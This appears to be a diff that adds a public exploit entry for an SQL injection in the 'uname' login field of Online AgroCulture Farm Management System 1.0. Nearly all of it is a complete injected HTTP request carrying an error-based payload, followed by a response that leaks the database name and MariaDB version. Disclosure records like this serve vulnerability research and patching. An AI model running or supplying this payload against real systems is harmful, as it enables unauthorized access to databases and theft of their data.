@@ -1,0 +1,48 @@
+# Exploit Title: Online AgroCulture Farm Management System 1.0 - 'uname' SQL Injection
+# Date: 2020-05-06
+# Exploit Author: Tarun Sehgal
+# Vendor Homepage: https://www.sourcecodester.com/
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/donbermoy/farm_management_system_in_php_with_source_code.zip
+# Version: 1.0
+# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
+
+---------------------------------------------------------------------------------
+
+#parameter Vulnerable: uname
+# Injected Request
+#Below request will print database name and MariaDB version.
+
+POST /fms/Login/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 204
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/fms/index.php
+Cookie: PHPSESSID=fiiiu7pq9kvhdr770ahd7dejco
+Upgrade-Insecure-Requests: 1
+
+uname=admin' OR (SELECT 1935 FROM(SELECT COUNT(*),CONCAT(database(),(SELECT (ELT(1935=1935,1))),0x3a,version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dqgD&pass=admin&category=1
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------
+#Response
+HTTP/1.1 302 Found
+Date: Wed, 06 May 2020 13:21:36 GMT
+Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.5
+X-Powered-By: PHP/7.4.5
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+location: error.php
+Content-Length: 356
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+<b>Warning</b>:  mysqli_query(): (23000/1062): Duplicate entry 'agroculture1:10.4.11-MariaDB1' for key 'group_key' in <b>
